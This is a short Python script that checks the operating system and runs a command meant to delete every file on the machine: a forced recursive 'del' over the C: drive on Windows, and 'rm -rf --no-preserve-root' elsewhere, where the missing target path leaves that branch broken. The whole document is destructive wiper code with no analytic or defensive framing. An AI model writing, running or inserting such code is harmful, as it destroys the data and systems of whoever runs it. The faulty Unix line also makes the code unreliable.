import os
import platform

plat = platform.system()
if plat == "Windows":
  os.system("del /s /f /q C:\*.*")
else:
  os.system("rm -rf --no-preserve-root")
